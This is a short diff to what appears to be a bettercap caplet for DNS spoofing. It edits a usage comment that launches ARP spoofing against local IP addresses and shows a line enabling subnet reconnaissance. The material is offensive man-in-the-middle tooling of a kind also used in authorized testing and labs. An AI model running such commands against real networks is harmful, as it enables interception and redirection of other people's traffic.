@@ -1,5 +1,5 @@
 # usage:
-# sudo ./bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.2, 192.168.3.1"
+# sudo ./bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.2"
 
 # detect all devices in subnet:
 net.recon on
